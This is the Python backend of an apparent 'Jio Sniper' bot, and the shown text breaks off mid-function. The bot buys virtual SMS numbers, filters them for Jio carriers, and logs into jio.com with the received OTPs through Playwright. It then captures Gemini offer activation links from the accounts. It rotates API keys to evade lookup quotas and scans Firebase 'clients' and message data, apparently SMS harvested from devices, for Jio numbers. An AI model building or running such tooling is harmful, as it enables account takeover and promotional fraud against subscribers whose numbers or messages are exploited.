#!/usr/bin/env python3
"""
Jio Sniper Dashboard — Backend Server v2.0
FastAPI + Socket.IO + Playwright + Multi-Provider SMS APIs
Features: Resource Monitor, Settings, Analytics, Order Detail
"""
import asyncio
import aiohttp
import os
import re
import time
import json
import uuid
import sys
import shutil
import psutil
import random
import csv
import base64
import email
from email import policy
from urllib.parse import urlparse, parse_qs

from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".env"))

from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
import socketio
import uvicorn

# ─── Paths ────────────────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(BASE_DIR)
DATA_DIR = os.path.join(PROJECT_DIR, "data")
PROFILES_DIR = os.path.join(PROJECT_DIR, "profiles")
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
ANALYTICS_FILE = os.path.join(BASE_DIR, "analytics.json")
SPEED_MAP = {"slow": 2.0, "normal": 1.0, "fast": 0.3}
ANALYTICS_MAX_AGE_DAYS = 7

# ─── Default Configuration ───────────────────────────────────────────────────
DEFAULT_CONFIG = {
    "providers": {
        "OTPSMS": {
            "url": "https://www.otpsms.in/stubs/handler_api.php",
            "key": os.environ.get("OTPSMS_API_KEY", ""),
            "service": "jio",
            "country": "",
            "delay": 3
        },
        "UOTP": {
            "url": "https://uotp.store/api/stubs/handler_api.php",
            "key": os.environ.get("UOTP_API_KEY", ""),
            "service": "jio", "country": "22", "delay": 2
        },
        "Grizzly": {
            "url": "https://api.grizzlysms.com/stubs/handler_api.php",
            "key": os.environ.get("GRIZZLY_API_KEY", ""),
            "service": "jio", "country": "22", "delay": 3
        },
        "Tiger": {
            "url": "https://api.tiger-sms.com/stubs/handler_api.php",
            "key": os.environ.get("TIGER_API_KEY", ""),
            "service": "mjo", "country": "22", "delay": 5
        },
        "MeowSMS": {
            "url": "https://meowsms.shop/stubs/handler_api.php",
            "key": os.environ.get("MEOWSMS_API_KEY", ""),
            "service": "myjio", "country": "22", "delay": 3
        },
        "OTPDoctor": {
            "url": "https://www.otpdoctor.in/stubs/handler_api.php",
            "key": os.environ.get("OTPDOCTOR_API_KEY", ""),
            "service": "13318", "country": "in", "delay": 3
        },
        "FirebaseDirect": {
            "url": "",
            "key": "",
            "service": "jio", "country": "in", "delay": 0
        }
    },
    "firebase_urls": [u.strip() for u in os.environ.get("FIREBASE_URLS", "").split(",") if u.strip()],
    "otpsms_servers": ["1", "2", "5", "6", "7", "8", "9", "11", "12", "13", "33", "36", "71", "234", "458", "2344", "4566", "64653"],
    "uotp_servers": ["5", "3", "4", "2", "1", "8"],
    "otpdoctor_services": ["13318", "13273"],
    "omkar_keys": [k.strip() for k in os.environ.get("OMKAR_API_KEYS", "").split(",") if k.strip()],
    "omkar_usage": {},
    "timing": {
        "otp_poll_interval": 3,
        "cancel_wait_seconds": 45,
        "max_otp_attempts": 60
    }
}

JIO_LOGIN_URL = "https://www.jio.com/selfcare/login/"
OTP_CLICK_INTERVAL = 13  # Min gap between Generate OTP clicks (controlled by UI)
BROWSER_LAUNCH_INTERVAL = 13  # Interval between browser launches (controlled by UI)

# ─── Proxies ─────────────────────────────────────────────────────────────────


# ─── Load / Save Config ──────────────────────────────────────────────────────
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                saved = json.load(f)
                # Deep merge providers so new ones (like FirebaseDirect) appear
                if "providers" in saved:
                    for p_name, p_data in DEFAULT_CONFIG["providers"].items():
                        if p_name not in saved["providers"]:
                            saved["providers"][p_name] = p_data
                
                # Merge with defaults for any missing keys
                merged = DEFAULT_CONFIG.copy()
                merged.update(saved)
                # Force dynamic keys from env to override saved static keys
                for p_name, p_data in merged.get("providers", {}).items():
                    default_key = DEFAULT_CONFIG["providers"].get(p_name, {}).get("key")
                    if default_key:
                        p_data["key"] = default_key
                merged["omkar_keys"] = DEFAULT_CONFIG["omkar_keys"]
                if "firebase_urls" not in merged:
                    merged["firebase_urls"] = DEFAULT_CONFIG["firebase_urls"]
                return merged
        except:
            pass
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f, indent=2)

config = load_config()

# ─── Analytics Persistence ────────────────────────────────────────────────────
def load_analytics():
    if os.path.exists(ANALYTICS_FILE):
        try:
            with open(ANALYTICS_FILE, 'r') as f:
                data = json.load(f)
                # Purge entries older than 7 days
                cutoff = time.time() - (ANALYTICS_MAX_AGE_DAYS * 86400)
                data["events"] = [e for e in data.get("events", []) if e.get("t", 0) > cutoff]
                return data
        except:
            pass
    return {"events": [], "sessions": []}

def save_analytics():
    # Purge old entries before saving
    cutoff = time.time() - (ANALYTICS_MAX_AGE_DAYS * 86400)
    analytics["events"] = [e for e in analytics.get("events", []) if e.get("t", 0) > cutoff]
    with open(ANALYTICS_FILE, 'w') as f:
        json.dump(analytics, f)

def record_analytics_event(provider, event_type, extra=None):
    """Record a timestamped analytics event."""
    entry = {"t": time.time(), "p": provider, "e": event_type}
    if extra:
        entry.update(extra)
    analytics["events"].append(entry)
    # Periodic save (every 10 events)
    if len(analytics["events"]) % 10 == 0:
        save_analytics()

analytics = load_analytics()

# ─── App Setup ────────────────────────────────────────────────────────────────
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')
app = FastAPI()
sio_app = socketio.ASGIApp(sio, app)

static_dir = os.path.join(BASE_DIR, "static")
app.mount("/static", StaticFiles(directory=static_dir), name="static")

# Security token matching the one in the Cloudflare Worker
WEBHOOK_SECRET = "YOUR_SECRET_TOKEN"

@app.post("/api/incoming-email")
async def receive_incoming_email(request: Request):
    # 1. Verify the security token
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {WEBHOOK_SECRET}":
        raise HTTPException(status_code=401, detail="Unauthorized")

    # 2. Parse the JSON from Cloudflare
    data = await request.json()
    from_address = data.get("from")
    to_address = data.get("to")
    subject = data.get("subject")
    raw_email_str = data.get("raw_email")

    print(f"📧 New Email Received from {from_address} | Subject: {subject}")

    # 3. Parse the raw email to get the plain text body
    if raw_email_str:
        msg = email.message_from_string(raw_email_str, policy=policy.default)
        body_text = ""
        
        if msg.is_multipart():
            for part in msg.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get("Content-Disposition"))
                
                if content_type == "text/plain" and "attachment" not in content_disposition:
                    body_text = part.get_payload(decode=True).decode(part.get_content_charset() or 'utf-8')
                    break
        else:
            body_text = msg.get_payload(decode=True).decode(msg.get_content_charset() or 'utf-8')
            
        print(f"Body snippet: {body_text.strip()[:100]}...")
        # You can add regex here to extract data from body_text

    return JSONResponse(content={"status": "success", "message": "Email processed"})

@app.get("/")
async def index():
    return FileResponse(os.path.join(static_dir, "index.html"))

@app.get("/download/success")
async def download_success():
    if not os.path.exists(SUCCESS_CSV):
        return {"error": "File not found"}
    return FileResponse(SUCCESS_CSV, media_type='text/csv', filename="extracted_links.csv")

@app.get("/download/failed")
async def download_failed():
    if not os.path.exists(FAILED_CSV):
        return {"error": "File not found"}
    return FileResponse(FAILED_CSV, media_type='text/csv', filename="failed_links.csv")

# ─── Global State ─────────────────────────────────────────────────────────────
class State:
    orders = {}
    sniper_tasks = []
    is_sniping = False
    stop_event = None
    http_session = None
    browser = None
    pw = None
    omkar_index = 0
    dead_omkar_keys = set()
    active_browsers = 0
    jio_count = 0
    jio_count_lock = None  # initialized on first use
    target_count = 5
    stats = {"fetched": 0, "jio": 0, "otp": 0, "login": 0, "otp_times": []}
    system_monitor_task = None
    omkar_gen_stop = False
    
    # Batch Tracking
    batch_total = 0
    batch_checked = 0
    batch_start_time = 0
    
    # Firebase State
    firebase_otp_queues = {}
    firebase_listener_task = None
    last_otp_click_time = 0  # global throttle for Generate OTP clicks
    last_browser_launch_time = 0 # global throttle for browser launches
    otp_click_lock = None

state = State()

# ─── System Resource Monitor ─────────────────────────────────────────────────
async def system_monitor_loop():
    """Emit CPU/RAM stats every 2 seconds."""
    while True:
        try:
            cpu = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            omkar_usage_dict = config.get("omkar_usage", {})
            omkar_keys_list = config.get("omkar_keys", [])
            
            omkar_data = []
            for i, key in enumerate(omkar_keys_list):
                usage = omkar_usage_dict.get(key, 0)
                omkar_data.append({
                    "label": f"Key {i+1} (..{key[-4:]})",
                    "usage": usage,
                    "max": 200
                })
            
            browser_count = sum(1 for o in state.orders.values() if o.get("_context") is not None)
            
            await sio.emit("system_stats", {
                "cpu": round(cpu, 1),
                "ram_used": round(mem.used / (1024**3), 1),
                "ram_total": round(mem.total / (1024**3), 1),
                "ram_percent": mem.percent,
                "browsers_open": browser_count,
                "omkar_data": omkar_data
            })
        except:
            pass
        await asyncio.sleep(2)

# ─── SMS API Functions ────────────────────────────────────────────────────────
async def get_balance(p_name):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return None
    try:
        async with state.http_session.get(cfg["url"], params={"action": "getBalance", "api_key": cfg["key"]}) as resp:
            text = (await resp.text()).strip()
            if text.startswith("ACCESS_BALANCE:"):
                return float(text.split(":", 1)[1])
    except:
        pass
    return None

async def buy_grizzly_number():
    """Attempt to buy a Grizzly SMS number for Chile or Indonesia for 'ot' service."""
    cfg = config["providers"].get("Grizzly", {})
    if not cfg:
        return None, None, None, None
        
    api_key = cfg["key"]
    base_url = cfg["url"]
    
    # Try Chile first (151), then Indonesia (6)
    for country_id, country_name, prefix in [("151", "Chile", "56"), ("6", "Indonesia", "62")]:
        try:
            params = {
                "api_key": api_key,
                "action": "getNumber",
                "service": "ot",  # Any other
                "country": country_id
            }
            async with state.http_session.get(base_url, params=params) as resp:
                text = (await resp.text()).strip()
                if text.startswith("ACCESS_NUMBER:"):
                    parts = text.split(":")
                    tzid = parts[1]
                    full_number = parts[2]
                    
                    # Ensure prefix is stripped properly
                    local_number = full_number
                    if local_number.startswith(prefix):
                        local_number = local_number[len(prefix):]
                    
                    return tzid, local_number, country_name, full_number
        except Exception:
            pass
            
    return None, None, None, None

async def poll_grizzly_otp(tzid, timeout=65):
    """Poll for OTP for a given transaction ID."""
    cfg = config["providers"].get("Grizzly", {})
    if not cfg:
        return None
        
    api_key = cfg["key"]
    base_url = cfg["url"]
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            params = {
                "api_key": api_key,
                "action": "getStatus",
                "id": tzid
            }
            async with state.http_session.get(base_url, params=params) as resp:
                text = (await resp.text()).strip()
                if text.startswith("STATUS_OK:"):
                    return text.split(":")[1]
        except Exception:
            pass
        await asyncio.sleep(3)
    return None

async def cancel_grizzly_number(tzid):
    """Cancel number to get refund if OTP never arrived."""
    cfg = config["providers"].get("Grizzly", {})
    if not cfg:
        return False
        
    api_key = cfg["key"]
    base_url = cfg["url"]
    
    try:
        params = {
            "api_key": api_key,
            "action": "setStatus",
            "status": "8", # Cancel code for Grizzly
            "id": tzid
        }
        async with state.http_session.get(base_url, params=params) as resp:
            text = (await resp.text()).strip()
            return "ACCESS_CANCEL" in text
    except Exception:
        pass
    return False

async def get_carrier(number_str):
    if not number_str.startswith('+'): number_str = '+' + number_str
    url = "https://carrier-lookup-api.omkar.cloud/lookup"
    omkar_keys = config.get("omkar_keys", [])
    
    if "omkar_usage" not in config:
        config["omkar_usage"] = {}
        
    for _ in range(len(omkar_keys)):
        key = omkar_keys[state.omkar_index % len(omkar_keys)]
        if key not in config["omkar_usage"]:
            config["omkar_usage"][key] = 0
            
        try:
            async with state.http_session.get(url, params={"phone": number_str}, headers={"API-Key": key}) as resp:
                if resp.status in [429, 400, 403]:
                    data = await resp.json()
                    msg = data.get("message", "").lower()
                    if "exceeded" in msg or "verify your phone number" in msg:
                        config["omkar_usage"][key] = 200
                        save_config(config)
                        state.omkar_index = (state.omkar_index + 1) % len(omkar_keys)
                        continue
                if resp.status == 200:
                    config["omkar_usage"][key] += 1
                    save_config(config)
                    return (await resp.json()).get("carrier", "Unknown")
        except:
            pass
    return "Unknown"

async def buy_number(p_name):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return {"status": "error"}
    
    # Base parameters
    params = {"action": "getNumber", "api_key": cfg["key"]}
    if cfg.get("country"):
        params["country"] = cfg["country"]
    
    # Handle provider-specific rotations (servers or services)
    rotations = [None]
    if p_name == "OTPSMS":
        rotations = config.get("otpsms_servers", [])
        params["service"] = cfg["service"]
    elif p_name == "UOTP":
        rotations = config.get("uotp_servers", [])
        params["service"] = cfg["service"]
    elif p_name == "OTPDoctor":
        rotations = config.get("otpdoctor_services", [])
    else:
        params["service"] = cfg["service"]
        
    for rot in rotations:
        if p_name == "OTPSMS" and rot:
            params["server"] = rot
        elif p_name == "UOTP" and rot:
            params["operator"] = rot
        elif p_name == "OTPDoctor" and rot:
            params["service"] = rot
            
        try:
            async with state.http_session.get(cfg["url"], params=params) as resp:
                text = (await resp.text()).strip()
                if text.startswith("ACCESS_NUMBER:"):
                    parts = text.split(":")
                    return {"status": "success", "aid": parts[1], "phone": parts[2]}
        except:
            pass
    return {"status": "error"}

async def get_otp_status(p_name, aid):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return "ERROR"
    try:
        async with state.http_session.get(cfg["url"], params={"action": "getStatus", "api_key": cfg["key"], "id": aid}) as resp:
            return (await resp.text()).strip()
    except:
        return "ERROR"

async def cancel_api_number(p_name, aid):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return "ERROR"
    try:
        async with state.http_session.get(cfg["url"], params={"action": "setStatus", "api_key": cfg["key"], "status": "8", "id": aid}) as resp:
            return (await resp.text()).strip()
    except:
        return "ERROR"

# ─── Order Helpers ────────────────────────────────────────────────────────────
def order_event(order, msg):
    """Add a timestamped event to an order's lifecycle log."""
    if "events" not in order:
        order["events"] = []
    order["events"].append({"t": time.time(), "msg": msg})

def safe_order(order):
    """Return order dict without internal references for JSON serialization."""
    return {k: v for k, v in order.items() if not k.startswith('_')}

async def emit_order(order):
    state.orders[order["id"]] = order
    await sio.emit("number_update", safe_order(order))

async def emit_stats():
    payload = {
        "fetched": state.stats["fetched"],
        "jio": state.stats["jio"],
        "otp": state.stats["otp"],
        "login": state.stats["login"]
    }
    otp_times = state.stats.get("otp_times", [])
    if otp_times:
        payload["otp_avg"] = round(sum(otp_times) / len(otp_times), 1)
        payload["otp_min"] = round(min(otp_times), 1)
        payload["otp_max"] = round(max(otp_times), 1)
        payload["otp_count"] = len(otp_times)
    await sio.emit("stats_update", payload)

async def emit_batch_progress():
    if state.batch_total == 0:
        return
        
    elapsed = time.time() - state.batch_start_time
    minutes = elapsed / 60.0
    
    tpm = 0
    eta_seconds = 0
    if minutes > 0:
        tpm = state.batch_checked / minutes
        
    remaining = max(0, state.batch_total - state.batch_checked)
    
    if tpm > 0:
        eta_minutes = remaining / tpm
        eta_seconds = eta_minutes * 60
        
    def format_time(secs):
        if secs < 60: return f"{int(secs)}s"
        m = int(secs // 60)
        s = int(secs % 60)
        if m < 60: return f"{m}m {s}s"
        h = int(m // 60)
        m = m % 60
        return f"{h}h {m}m"
        
    await sio.emit("batch_progress", {
        "total": state.batch_total,
        "checked": state.batch_checked,
        "remaining": remaining,
        "tpm": round(tpm, 1),
        "eta": format_time(eta_seconds) if tpm > 0 else "--:--"
    })

async def emit_log(msg, level="info"):
    await sio.emit("log", {"message": msg, "level": level})

# ─── Number Processing Pipeline ──────────────────────────────────────────────
async def process_number(p_name, aid, phone):
    order_id = str(uuid.uuid4())[:8]
    order = {
        "id": order_id, "aid": aid, "phone": phone, "provider": p_name,
        "status": "checking_carrier", "carrier": None, "otp": None,
        "timestamp": time.time(), "events": []
    }
    order_event(order, f"Number purchased from {p_name}")
    await emit_order(order)
    state.stats["fetched"] += 1
    record_analytics_event(p_name, "fetched")
    await emit_stats()
    
    # Check carrier
    order_event(order, "Checking carrier via MNP lookup...")
    carrier = await get_carrier(phone)
    order["carrier"] = carrier
    order_event(order, f"Carrier identified: {carrier}")
    
    if "jio" in carrier.lower() or "reliance" in carrier.lower():
        state.stats["jio"] += 1
        record_analytics_event(p_name, "jio")
        await emit_stats()
        order["status"] = "waiting_otp"
        await emit_order(order)
        await emit_log(f"✓ [{p_name}] {phone}: {carrier} — TRUE JIO!", "success")
        
        asyncio.create_task(handle_jio_number(order))
    else:
        state.jio_count = max(0, state.jio_count - 1)
        order["status"] = "non_jio"
        await emit_order(order)
        await emit_log(f"✗ [{p_name}] {phone}: {carrier}", "warn")
        asyncio.create_task(cancel_order(order))

async def handle_jio_number(order):
    try:
        await _handle_jio_number_impl(order)
    finally:
        state.jio_count = max(0, state.jio_count - 1)

async def _handle_jio_number_impl(order):
    aid = order["aid"]
    phone = order["phone"]
    p_name = order["provider"]
    timing = config.get("timing", {})
    poll_interval = timing.get("otp_poll_interval", 3)
    max_attempts = timing.get("max_otp_attempts", 60)
    
    clean_phone = phone[2:] if phone.startswith("91") and len(phone) > 10 else phone
    
    # Browser automation: Open immediately to trigger OTP
    context = None
    page = None
    if state.browser:
        try:
            order["status"] = "logging_in"
            order_event(order, "Opening browser and navigating to jio.com...")
            await emit_order(order)
            
            profile_path = os.path.join(PROFILES_DIR, f"session_{order['id']}")
            os.makedirs(profile_path, exist_ok=True)
            
            context = await state.browser.new_context(
                user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            page = await context.new_page()
            
            order["_context"] = context
            order["_page"] = page
            
            await page.goto(JIO_LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(2)
            
            order_event(order, f"Typing phone number: {clean_phone}")
            await page.locator('[data-testid="numberField"]').fill(clean_phone)
            await asyncio.sleep(1)
            
            order_event(order, "Clicking Generate OTP...")
            await page.locator('[data-testid="generateOTPButton"]').click()
            await emit_log(f"[{phone}] Clicked Generate OTP on jio.com", "info")
            await asyncio.sleep(2)
            
            # Detect Jio IP Rate Limits
            if await page.locator('text="exceeded the maximum attempts"').count() > 0:
                raise Exception("Jio IP Rate Limited: Exceeded max attempts!")
            if await page.locator('text="try again after some time"').count() > 0:
                raise Exception("Jio IP Rate Limited: Try again later!")

            
        except Exception as e:
            err_msg = str(e)
            order_event(order, f"Browser setup failed: {err_msg}")
            
            if "Rate Limited" in err_msg:
                await emit_log(f"🚨 [{phone}] Jio Rate Limit hit! Cancelling number.", "error")
                asyncio.create_task(cancel_order(order, instant=True))
            else:
                order["status"] = "cancelled"
                await emit_log(f"[{phone}] Browser error: {err_msg[:80]}", "error")
                # Immediate refund attempt but maybe not instant if we want to be safe
                asyncio.create_task(cancel_order(order, instant=True))
            
            await emit_order(order)
            if context:
                await context.close()
            return
    
    order["status"] = "waiting_otp"
    order_event(order, "Waiting for OTP from SMS provider...")
    await emit_order(order)
    
    max_attempts = 80  # Override to 4 minutes (80 attempts * 3s) for the Resend OTP flow
    
    # Poll for OTP
    otp_code = None
    start_time = time.time()
    resend_clicked = False
    
    for attempt in range(max_attempts):
        elapsed = time.time() - start_time
        if elapsed > 121 and page and not resend_clicked:
            resend_clicked = True
            try:
                order_event(order, "2 mins passed. Clicking Resend OTP on jio.com...")
                await emit_order(order)
                await emit_log(f"[{phone}] Clicking Resend OTP...", "warn")
                await page.locator('button[aria-label="Resend OTP"]').click(timeout=5000)
                await asyncio.sleep(1)
            except Exception as e:
                order_event(order, f"Could not click Resend OTP: {str(e)[:50]}")
                await emit_log(f"[{phone}] Failed to click Resend OTP", "error")

        # Graceful stop: removed early return so active Jio logins finish processing
        status = await get_otp_status(p_name, aid)
        if status.startswith("STATUS_OK:"):
            otp_text = status.split(":", 1)[1]
            match = re.search(r'\b(\d{6})\b', otp_text)
            otp_code = match.group(1) if match else otp_text.strip()
            state.stats["otp"] += 1
            record_analytics_event(p_name, "otp")
            await emit_stats()
            order["otp"] = otp_code
            order["status"] = "otp_received"
            order_event(order, f"OTP received: {otp_code}")
            os.system("afplay /System/Library/Sounds/Glass.aiff &")
            await emit_order(order)
            await emit_log(f"✅ [{p_name}] {phone} OTP: {otp_code}", "success")
            break
        elif "CANCEL" in status:
            order["status"] = "cancelled"
            order_event(order, "Cancelled by SMS provider (no OTP delivered)")
            await emit_order(order)
            await emit_log(f"[{p_name}] {phone} cancelled by server", "error")
            if context:
                await context.close()
            return
        await asyncio.sleep(poll_interval)
    
    if not otp_code:
        order["status"] = "cancelling"
        order_event(order, "Timed out waiting for OTP. Cancelling number...")
        await emit_order(order)
        await emit_log(f"[{p_name}] {phone} no OTP received", "error")
        asyncio.create_task(cancel_order(order, instant=True))
        if context:
            await context.close()
        return
        
    # If we have browser, type OTP and submit
    if page:
        try:
            order["status"] = "logging_in"
            await emit_order(order)
            
            order_event(order, f"Typing OTP: {otp_code}")
            for i, digit in enumerate(otp_code[:6]):
                await page.locator(f'#basic-input-testInput-code-block-{i}').fill(digit)
                await asyncio.sleep(0.1)
            await asyncio.sleep(1)
            
            order_event(order, "Clicking Submit...")
            await page.locator('button:has-text("Submit")').click()
            await asyncio.sleep(3)
            
            state.stats["login"] += 1
            record_analytics_event(p_name, "login")
            await emit_stats()
            # --- AUTO EXTRACTION LOGIC ---
            order["status"] = "logging_in"
            order_event(order, "Looking for Gemini offer banner...")
            await emit_order(order)
            
            captured_url = []
            async def handle_route(route):
                req_url = route.request.url
                if "serviceactivation.google.com" in req_url or "accounts.google.com" in req_url or "oauth2" in req_url.lower():
                    captured_url.append(req_url)
                    try:
                        await route.abort()
                    except: pass
                else:
                    try:
                        await route.continue_()
                    except: pass
            
            await context.route("**/*", handle_route)
            
            try:
                banner_el = None
                el_id = None
                for _ in range(60):
                    gemini_el = await page.query_selector('#imageNotification')
                    if gemini_el:
                        banner_el = gemini_el
                        el_id = "imageNotification"
                        break
                    alt_el = await page.query_selector('section[class*="notificationContainer"]')
                    if alt_el:
                        text = await alt_el.inner_text()
                        if text and len(text.strip()) > 10:
                            banner_el = alt_el
                            break
                    await asyncio.sleep(1)
                    
                if not banner_el:
                    raise Exception("No offer banner found after 60s")
                
                if el_id == "imageNotification":
                    order_event(order, "Found Gemini banner! Clicking...")
                    await emit_order(order)
                    
                    # We expect the click to open a new tab/redirect
                    await page.click('#imageNotification')
                else:
                    # It's an alternative offer (YouTube Premium, Amazon Prime, etc.)
                    alt_els = await page.query_selector_all('section[class*="notificationContainer"]')
                    texts = []
                    for el in alt_els:
                        t = await el.inner_text()
                        if t and len(t.strip()) > 10:
                            texts.append(" | ".join([line.strip() for line in t.split('\n') if line.strip()]))
                    clean_text = " || ".join(texts) if texts else "Unknown Alternative Offer"
                    
                    await emit_log(f"ℹ️ [{phone}] Alternative Offer Found: {clean_text}", "info")
                    order_event(order, f"Alternative Offer: {clean_text}")
                    await emit_order(order)
                    
                    with open(os.path.join(DATA_DIR, "alternative_offers.csv"), "a", newline="") as f:
                        csv.writer(f).writerow([p_name, aid, phone, clean_text])
                        
                    order["status"] = "cancelled"
                    await emit_order(order)
                    if context:
                        await context.close()
                    return
                
                # Wait for the redirect to be caught
                for _ in range(15):
                    if captured_url:
                        break
                    await asyncio.sleep(1)
                    
                if captured_url:
                    # Prioritize serviceactivation.google.com if found, otherwise use the first caught URL
                    target_link = next((url for url in captured_url if "serviceactivation.google.com" in url), captured_url[0])
                    
                    # Save to links.txt
                    with open(os.path.join(DATA_DIR, "links.txt"), "a") as f:
                        f.write(f"{phone} | {target_link}\n")
                        
                    order["status"] = "logged_in"
                    order_event(order, "✅ Link automatically extracted & saved to links.txt!")
                    await emit_order(order)
                    os.system("afplay /System/Library/Sounds/Ping.aiff &")
                    await emit_log(f"🎉 [{phone}] Gemini Link Saved!", "success")
                    await asyncio.sleep(2)
                    
                    # Successfully done, close browser
                    await context.close()
                    order["_context"] = None
                    return
                else:
                    order_event(order, "⚠️ Clicked banner but redirect not caught.")
            except Exception as e:
                order_event(order, f"⚠️ Banner not found or error: {str(e)[:40]}")

            # Fallback to manual mode if automation failed or timed out
            order["status"] = "extract_link"
            order_event(order, "✅ Login successful! Banner not found, do manual extraction.")
            await emit_order(order)
            await emit_log(f"🎉 [{p_name}] {phone} LOGGED IN! Extract link now.", "success")
            
            # 20-minute timeout for manual extraction
            await asyncio.sleep(1200)
            if order.get("status") == "extract_link":
                order["status"] = "completed"
                order_event(order, "⏰ 20 minutes passed. Closing tab to free RAM.")
                await emit_order(order)
                await emit_log(f"🧹 [{phone}] Auto-closed after 20 mins of inactivity", "warn")
                if context:
                    try:
                        await context.close()
                    except:
                        pass
                if order["id"] in state.orders:
                    del state.orders[order["id"]]
                    await sio.emit("number_remove", {"id": order["id"]})
            
        except Exception as e:
            order["status"] = "cancelled"
            order_event(order, f"Browser error typing OTP: {str(e)}")
            await emit_order(order)
            await emit_log(f"[{phone}] Browser error: {str(e)[:80]}", "error")
            await context.close()

async def cancel_order(order, instant=False):
    order["status"] = "cancelling"
    if instant:
        cancel_wait = 0
    else:
        cancel_wait = config.get("timing", {}).get("cancel_wait_seconds", 120)
        
        # OTPDoctor requires 5 minutes (300 seconds) before cancellation
        if order["provider"] == "OTPDoctor":
            cancel_wait = max(cancel_wait, 300)
            
    if cancel_wait > 0:
        order_event(order, f"Waiting {cancel_wait}s before cancelling...")
        await emit_order(order)
        await asyncio.sleep(cancel_wait)
    else:
        order_event(order, "Cancelling number immediately...")
        await emit_order(order)
    
    while True:
        status = await cancel_api_number(order["provider"], order["aid"])
        if "EARLY_CANCEL_DENIED" in status:
            order_event(order, "Early cancel denied, retrying in 10s...")
            await asyncio.sleep(10)
        elif "CANCEL" in status or "ACTIVATION" in status:
            order["status"] = "cancelled"
            order_event(order, "Successfully cancelled & refunded")
            await emit_order(order)
            await emit_log(f"[{order['phone']}] Cancelled & refunded", "info")
            await asyncio.sleep(5)
            if order["id"] in state.orders:
                del state.orders[order["id"]]
                await sio.emit("number_remove", {"id": order["id"]})
            break
        else:
            order["status"] = "cancelled"
            order_event(order, f"Cancel response: {status}")
            await emit_order(order)
            break

# ─── Firebase Direct Architecture ────────────────────────────────────────────
SUCCESS_CSV = os.path.join(DATA_DIR, "extracted_links.csv")
FAILED_CSV = os.path.join(DATA_DIR, "failed_links.csv")

def init_csvs():
    if not os.path.exists(SUCCESS_CSV):
        with open(SUCCESS_CSV, "w", newline="") as f:
            csv.writer(f).writerow(["Firebase URL", "Device ID", "Phone Number", "Extracted Link", "Status (Online/Offline)", "OTP Wait Time (s)"])
    if not os.path.exists(FAILED_CSV):
        with open(FAILED_CSV, "w", newline="") as f:
            csv.writer(f).writerow(["Firebase URL", "Device ID", "Phone Number", "Failed Step", "Status (Online/Offline)", "OTP Wait Time (s)"])

# Regional digit maps for normalization
REGIONAL_DIGITS = str.maketrans(
    "०१२३४५६७८९"  # Hindi/Devanagari
    "০১২৩৪৫৬৭৮৯"  # Bengali
    "੦੧੨੩੪੫੬੭੮੯"  # Punjabi
    "૦૧૨૩૪૫૬૭૮૯"  # Gujarati
    "୦୧୨୩୪୫୬୭୮୯"  # Odia
    "౦౧౨౩౪౫౬౭౮౯"  # Telugu
    "೦೧೨೩೪೫೬೭೮೯"  # Kannada
    "൦൧൨൩൪൫൬൭൮൯"  # Malayalam
    "௦௧௨௩௪௫௬௭௮௯",  # Tamil
    "0123456789" * 9
)

def normalize_digits(text):
    """Convert regional script digits to Latin digits."""
    return text.translate(REGIONAL_DIGITS)

def extract_phone_from_text(text):
    """Extract any 10-digit Indian mobile number, normalizing regional digits."""
    normalized = normalize_digits(text)
    match = re.search(r'(?<!\d)([6-9]\d{9})(?!\d)', normalized)
    return match.group(1) if match else None

def is_jio_message(msg_data):
    """Check if a message is Jio-related by checking both message body and sender."""
    text = msg_data.get("message", "").lower()
    sender = msg_data.get("sender", "").lower()
    return "jio" in text or "jio" in sender

def parse_firebase_datetime(dt_str):
    """Parse Firebase dateTime like '22-07-2025 | 01:12 pm' to a timestamp."""
    try:
        from datetime import datetime
        clean = dt_str.replace(" | ", " ").strip()
        for fmt in ["%d-%m-%Y %I:%M %p", "%d-%m-%Y %I:%M:%S %p", "%d-%m-%Y %H:%M"]:
            try:
                return datetime.strptime(clean, fmt).timestamp()
            except ValueError:
                continue
    except Exception:
        pass
    return 0

def clean_firebase_url(url):
    """Extract raw Firebase URL from base64 Netlify strings if present."""
    url = url.strip()
    if "?s=" in url:
        try:
            parsed = urlparse(url)
            s_param = parse_qs(parsed.query).get('s', [None])[0]
            if s_param:
                decoded = base64.b64decode(s_param).decode('utf-8')
                if "|||" in decoded:
                    return decoded.split("|||")[0].strip()
                elif decoded.startswith("http"):
                    return decoded.strip()
        except Exception:
            pass
    return url.rstrip('/')

async def fetch_initial_mapping(deep_scan=False):
    scan_label = "DEEP SCAN" if deep_scan else "ONLINE ONLY"
    await emit_log(f"Fetching Firebase clients ({scan_label})...", "info")
    device_map = {}
    
    urls = config.get("firebase_urls", [])
    urls = [clean_firebase_url(u) for u in urls if u.strip()]
    if not urls:
        await emit_log("No Firebase URLs configured!", "error")
        return device_map
    
    # 5-day cutoff in milliseconds (Firebase message keys are ms timestamps)
    cutoff_ms = int((time.time() - 432000) * 1000)
    
    async def scan_single_fb(fb_url):
        """Scan a single Firebase URL and return its device mappings."""
        local_map = {}
        try:
            # 1. Fetch the online status of clients
            online_devices = set()
            for attempt in range(3):
                try:
                    async with state.http_session.get(f"{fb_url}/clients.json", timeout=90) as resp:
                        if resp.status == 200:
                            clients_data = await resp.json()
                            if clients_data:
                                for dev_id, dev_info in clients_data.items():
                                    if isinstance(dev_info, dict) and dev_info.get("status") is True:
                                        online_devices.add(dev_id)
                            break
                except Exception as req_err:
